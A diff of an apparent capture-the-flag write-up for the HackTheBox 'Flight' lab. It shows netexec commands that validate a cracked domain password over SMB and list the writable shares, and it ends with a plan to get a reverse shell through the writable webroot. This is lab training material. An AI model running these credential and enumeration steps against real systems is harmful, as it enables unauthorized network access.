@@ -472,8 +472,30 @@ c.bum:Tikkycoll_431012284
 Ill validate these credentials
 
 ```python
-
+nxc smb g0.flight.htb -u c.bum -p 'Tikkycoll_431012284'  
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284
 ```
+This user has been compromised
+
+## Access on shares as `c.bum`
+```python
+nxc smb g0.flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.228.120  445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
+SMB         10.129.228.120  445    G0               [*] Enumerated shares
+SMB         10.129.228.120  445    G0               Share           Permissions     Remark
+SMB         10.129.228.120  445    G0               -----           -----------     ------
+SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
+SMB         10.129.228.120  445    G0               C$                              Default share
+SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
+SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
+SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
+SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
+SMB         10.129.228.120  445    G0               Users           READ            
+SMB         10.129.228.120  445    G0               Web             READ,WRITE
+```
+Now i have write access on `Web` which as previously identified is where the webroot is held so i should be able to make a rewv
 
 ```python
 
